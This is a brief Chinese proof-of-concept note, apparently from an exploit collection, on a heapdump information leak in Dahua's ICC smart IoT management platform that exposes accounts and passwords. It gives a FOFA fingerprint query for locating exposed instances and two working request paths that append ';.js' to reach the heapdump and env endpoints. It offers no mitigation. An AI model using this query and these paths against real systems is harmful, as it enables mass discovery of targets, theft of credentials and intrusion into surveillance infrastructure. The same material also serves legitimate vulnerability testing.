# 大华ICC智能物联综合管理平台heapdump敏感信息泄露

大华ICC智能物联综合管理平台heapdump文件敏感信息泄露，可以获取账号和密码。

## fofa

```
body="static/fontshd/font-hd.css" || body="客户端会小于800"
```

## poc

```
/evo-apigw/dsc-mac/heapdump;.js
/evo-apigw/dsc-mac/env;.js
```



![image-20240702231803309](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407022318391.png)